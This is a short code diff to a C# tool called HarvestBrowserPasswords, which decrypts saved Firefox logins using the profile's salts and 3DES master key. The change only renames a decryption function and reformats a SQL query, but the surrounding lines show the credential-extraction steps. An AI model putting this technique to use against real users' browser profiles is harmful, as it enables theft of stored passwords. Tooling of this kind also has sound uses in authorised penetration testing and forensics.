@@ -41,13 +41,13 @@ namespace HarvestBrowserPasswords
                 FirefoxLoginsJSON.Rootobject JSONLogins = GetJSONLogins(ProfileDir);
 
                 //Decrypt password-check value to ensure correct decryption
-                DecryptedPasswordCheck = Decrypt3DESMasterKey(GlobalSalt, EntrySaltPasswordCheck, CipherTextPasswordCheck, MasterPassword);
+                DecryptedPasswordCheck = Decrypt3DES(GlobalSalt, EntrySaltPasswordCheck, CipherTextPasswordCheck, MasterPassword);
 
                 if (PasswordCheck(DecryptedPasswordCheck))
                 {
                     //Decrypt master key (this becomes padded EDE key for username / password decryption)
                     //Master key should have 8 bytes of PKCS#7 Padding
-                    Decrypted3DESKey = Decrypt3DESMasterKey(GlobalSalt, EntrySalt3DESKey, CipherText3DESKey, MasterPassword);
+                    Decrypted3DESKey = Decrypt3DES(GlobalSalt, EntrySalt3DESKey, CipherText3DESKey, MasterPassword);
 
                     //Check for PKCS#7 padding and remove if it exists
                     Decrypted3DESKey = Unpad(Decrypted3DESKey);
@@ -122,7 +122,7 @@ namespace HarvestBrowserPasswords
 
                 //First query the metadata table to verify the master password
                 SQLiteCommand commandPasswordCheck = connection.CreateCommand();
-                commandPasswordCheck.CommandText = "SELECT item1,item2 FROM metadata WHERE id = 'password'";
+                commandPasswordCheck.CommandText = "SELECT item1, item2 FROM metadata WHERE id = 'password'";
                 SQLiteDataReader dataReader = commandPasswordCheck.ExecuteReader();
 
                 //Parse the ASN.1 data in the 'password' row to extract entry salt and cipher text for master password verification
@@ -166,7 +166,7 @@ namespace HarvestBrowserPasswords
             }
         }
 
-        public static byte[] Decrypt3DESMasterKey(byte[] globalSalt, byte[] entrySalt, byte[] cipherText, string masterPassword)
+        public static byte[] Decrypt3DES(byte[] globalSalt, byte[] entrySalt, byte[] cipherText, string masterPassword)
         {
             //https://github[.]com/lclevy/firepwd/blob/master/mozilla_pbe.pdf
 
